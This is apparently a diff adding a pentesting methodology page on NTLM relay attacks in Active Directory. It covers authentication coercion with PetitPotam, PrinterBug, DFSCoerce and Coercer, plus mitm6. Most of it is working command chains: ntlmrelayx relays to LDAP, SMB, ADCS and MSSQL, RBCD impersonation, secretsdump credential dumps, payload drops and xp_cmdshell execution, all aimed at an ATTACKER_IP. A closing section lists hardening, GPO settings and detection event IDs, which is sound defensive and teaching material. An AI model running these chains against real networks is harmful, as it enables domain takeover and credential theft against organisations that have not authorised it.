@@ -1,0 +1,315 @@
+---
+title: "Part 3: Exploiting Automated Relays"
+description: "NTLM relay attacks, authentication coercion (PetitPotam, PrinterBug, DFSCoerce), mitm6, and relay targets (LDAP, SMB, ADCS HTTP)."
+category: Methodology
+subcategory: Active Directory Attack
+order: 3
+tags: ["active-directory", "ntlm-relay", "petitpotam", "mitm6", "pentesting"]
+updated: 2026-04-11
+---
+
+# Part 3: Exploiting Automated Relays
+
+NTLM relay is one of the most powerful attack classes in Active Directory. The concept is simple: intercept an NTLM authentication attempt and forward it to a different service, authenticating as the victim. When combined with **coercion techniques** that force machines (including Domain Controllers) to authenticate to you, this often leads to immediate domain compromise.
+
+---
+
+## How NTLM Relay Works
+
+```
+Victim Machine                    Attacker                    Target Server
+      |                              |                              |
+      |  ← coerce authentication →   |                              |
+      |  ---NTLM Auth (negotiate)--> |                              |
+      |                              | ---NTLM Auth (negotiate)---> |
+      |                              | <--NTLM Challenge----------- |
+      |  <--NTLM Challenge---------- |                              |
+      |  ---NTLM Response----------> |                              |
+      |                              | ---NTLM Response-----------> |
+      |                              |       ✅ Authenticated!       |
+```
+
+The attacker never cracks the password — they simply proxy the authentication exchange.
+
+---
+
+## Step 1: Identify Relay Targets
+
+Not every machine can be relayed to. You need to check for **signing requirements**:
+
+```bash
+# Find SMB targets without signing (workstations are often vulnerable)
+crackmapexec smb 10.10.10.0/24 --gen-relay-list smb-targets.txt
+
+# Check LDAP signing
+crackmapexec ldap dc01 -u user -p pass -M ldap-checker
+
+# Check for ADCS HTTP enrollment (ESC8 target)
+crackmapexec http 10.10.10.0/24 -M adcs
+certipy find -u user@domain.local -p pass -dc-ip DC_IP -vulnerable
+```
+
+### Signing Requirements Matrix
+
+| Protocol | Default Signing | Relay Possible? |
+|---|---|---|
+| SMB (DCs) | Required | ❌ No |
+| SMB (workstations/servers) | Not required | ✅ Yes |
+| LDAP | Negotiated (often not enforced) | ✅ Usually |
+| LDAPS | Channel binding (if enabled) | ⚠️ Depends |
+| HTTP (ADCS) | None | ✅ Yes |
+| MSSQL | None | ✅ Yes |
+
+---
+
+## Step 2: Coerce Authentication
+
+Force a machine to authenticate to your attacker host. Multiple protocols support this:
+
+### PetitPotam (MS-EFSRPC)
+
+```bash
+# Unauthenticated (unpatched systems)
+PetitPotam.py ATTACKER_IP TARGET_IP
+
+# Authenticated (always works if EFS is available)
+PetitPotam.py -u user -p pass -d domain.local ATTACKER_IP TARGET_IP
+```
+
+### PrinterBug / SpoolSample (MS-RPRN)
+
+```bash
+# Requires valid domain creds + Print Spooler running on target
+printerbug.py domain.local/user:pass@TARGET_IP ATTACKER_IP
+SpoolSample.exe TARGET_IP ATTACKER_IP
+```
+
+### DFSCoerce (MS-DFSNM)
+
+```bash
+DFSCoerce.py -u user -p pass -d domain.local ATTACKER_IP TARGET_IP
+```
+
+### ShadowCoerce (MS-FSRVP)
+
+```bash
+ShadowCoerce.py -u user -p pass -d domain.local ATTACKER_IP TARGET_IP
+```
+
+### Coercer (Multi-Protocol Scanner)
+
+```bash
+# Scan for all available coercion methods
+Coercer.py scan -t TARGET_IP -u user -p pass -d domain.local
+
+# Coerce using all available methods
+Coercer.py coerce -t TARGET_IP -l ATTACKER_IP -u user -p pass -d domain.local
+```
+
+---
+
+## Relay Scenario 1: NTLM Relay to LDAP → RBCD
+
+**Severity:** 🔴 Critical
+
+The most common path to Domain Admin from a network position. Relay a machine account's authentication to LDAP to configure RBCD, then impersonate an admin.
+
+### Prerequisites
+- Coerce a machine account to authenticate to you
+- LDAP signing NOT enforced on the DC
+- MachineAccountQuota > 0 (or you already control a computer account)
+
+### Execution
+
+```bash
+# Terminal 1: Start relay — automatically configures RBCD
+ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access --escalate-user FAKEPC$
+
+# Terminal 2: Coerce DC or target server
+PetitPotam.py ATTACKER_IP DC01_IP
+
+# ntlmrelayx will:
+# 1. Create a new computer account (if --escalate-user not specified)
+# 2. Configure RBCD on the relayed machine account
+# 3. Output the details
+
+# Terminal 3: Complete RBCD exploitation
+getST.py -spn cifs/DC01.domain.local \
+  -impersonate administrator \
+  domain.local/'FAKEPC$':'YOURPASSWORD'
+
+export KRB5CCNAME=administrator.ccache
+secretsdump.py -k -no-pass domain.local/administrator@DC01.domain.local
+```
+
+---
+
+## Relay Scenario 2: NTLM Relay to SMB → Code Execution
+
+**Severity:** 🟠 High
+
+Relay to a machine without SMB signing to execute code.
+
+```bash
+# Terminal 1: Start relay with command execution
+ntlmrelayx.py -tf smb-targets.txt -smb2support -c "whoami > C:\relay-proof.txt"
+
+# Or drop a payload
+ntlmrelayx.py -tf smb-targets.txt -smb2support -e payload.exe
+
+# Or dump SAM database
+ntlmrelayx.py -tf smb-targets.txt -smb2support --dump-sam
+
+# Terminal 2: Coerce or wait for authentication
+# LLMNR/NBT-NS poisoning with Responder (in relay mode):
+Responder.py -I eth0 -rdw  # -w for WPAD, -d for DHCP, relay mode disables SMB/HTTP servers
+
+# Or active coercion
+PetitPotam.py ATTACKER_IP TARGET_IP
+```
+
+---
+
+## Relay Scenario 3: NTLM Relay to ADCS HTTP (ESC8)
+
+**Severity:** 🔴 Critical
+
+Relay to AD Certificate Services' HTTP enrollment endpoint to obtain a certificate as the relayed account. If you relay a DC machine account, you get a cert that allows DCSync.
+
+```bash
+# Terminal 1: Relay to ADCS
+ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController
+
+# Terminal 2: Coerce DC authentication
+PetitPotam.py ATTACKER_IP DC01_IP
+
+# ntlmrelayx outputs a base64 certificate
+
+# Terminal 3: Authenticate with the certificate
+certipy auth -pfx dc01.pfx -dc-ip DC_IP
+
+# Or use the cert for DCSync
+secretsdump.py -k -no-pass domain.local/DC01\$@dc01.domain.local
+```
+
+---
+
+## Relay Scenario 4: mitm6 — IPv6 DNS Takeover
+
+**Severity:** 🟠 High
+
+Most Windows networks have IPv6 enabled but don't use it. `mitm6` exploits this by acting as a rogue DHCPv6 server and DNS server, intercepting requests and coercing NTLM authentication via WPAD or DNS.
+
+```bash
+# Terminal 1: Start mitm6
+mitm6 -d domain.local --ignore-nofqdn
+
+# Terminal 2: Relay the intercepted auth to LDAP
+ntlmrelayx.py -6 -t ldaps://dc01.domain.local \
+  --delegate-access \
+  -wh wpad.domain.local
+
+# What happens:
+# 1. Victim machine gets an IPv6 address from mitm6
+# 2. Victim uses attacker as DNS server
+# 3. Victim requests WPAD configuration
+# 4. Attacker responds with WPAD pointing to itself
+# 5. Victim authenticates to attacker (NTLM)
+# 6. Attacker relays to LDAP → RBCD or account creation
+```
+
+> 💡 **Tip:** mitm6 is particularly effective in environments with WPAD enabled. It catches machine accounts as they boot or refresh their network configuration.
+
+---
+
+## Relay Scenario 5: Relay to MSSQL
+
+```bash
+# Relay to SQL Server — execute queries as the relayed user
+ntlmrelayx.py -t mssql://sql01.domain.local -q "SELECT SYSTEM_USER;"
+
+# Enable xp_cmdshell for OS command execution
+ntlmrelayx.py -t mssql://sql01.domain.local \
+  -q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';"
+```
+
+---
+
+## WebDAV + Coercion Combo
+
+When the WebClient service is running on a workstation, you can coerce authentication over HTTP instead of SMB — which **avoids SMB signing** entirely.
+
+```bash
+# Check if WebClient is running
+crackmapexec smb targets -u user -p pass -M webdav
+
+# Start WebDAV listener + relay
+ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access
+
+# Coerce via HTTP (WebDAV)
+PetitPotam.py ATTACKER@80/path TARGET_IP
+# The @ forces HTTP instead of SMB
+```
+
+---
+
+## Defense & Detection
+
+### Hardening
+
+| Control | What It Prevents |
+|---|---|
+| **Enable SMB signing** on all machines | SMB relay |
+| **Enable LDAP signing** | LDAP relay |
+| **Enable LDAP channel binding** | LDAPS relay |
+| **Enable EPA** on ADCS web enrollment | ESC8 relay |
+| **Disable NTLM** entirely (enforce Kerberos) | All NTLM relay |
+| **Disable IPv6** via GPO if unused | mitm6 attacks |
+| **Disable Print Spooler** on servers | PrinterBug coercion |
+| **Set MachineAccountQuota to 0** | Blocks RBCD computer creation |
+| **Disable WebClient** on servers | WebDAV relay |
+
+### GPO Settings
+
+```
+# SMB signing
+Computer Configuration → Policies → Windows Settings → Security Settings →
+  Local Policies → Security Options →
+    Microsoft network server: Digitally sign communications (always) → Enabled
+
+# LDAP signing
+Domain controller: LDAP server signing requirements → Require signing
+
+# Disable IPv6
+Computer Configuration → Administrative Templates → Network → IPv6 →
+  Disable IPv6 on all interfaces
+```
+
+### Detection (Event IDs)
+
+| Event ID | What It Catches |
+|---|---|
+| **4624** | Logon events — watch for network logons from unusual IPs |
+| **4648** | Explicit credential logon — relay indicators |
+| **8004** (NTLM audit) | NTLM authentication events — identify relay sources |
+
+### Network Monitoring
+
+- Watch for SMB traffic from unexpected sources
+- Alert on NTLM authentication to LDAP from non-DC IPs
+- Monitor for rogue DHCPv6 servers (mitm6 indicator)
+- Alert on certificate enrollment from machine accounts that shouldn't be enrolling
+
+&nbsp;
+
+&nbsp;
+
+---
+
+> **Next up → [Part 4: Exploiting AD Users](/docs/methodology/active-directory-attack/04-ad-users)** — DCSync, LSASS dumps, password spraying, Pass-the-Hash, and credential harvesting.
+
+&nbsp;
+
+## Related Writeups
+
+*Writeups that put these techniques into practice will be linked here.*
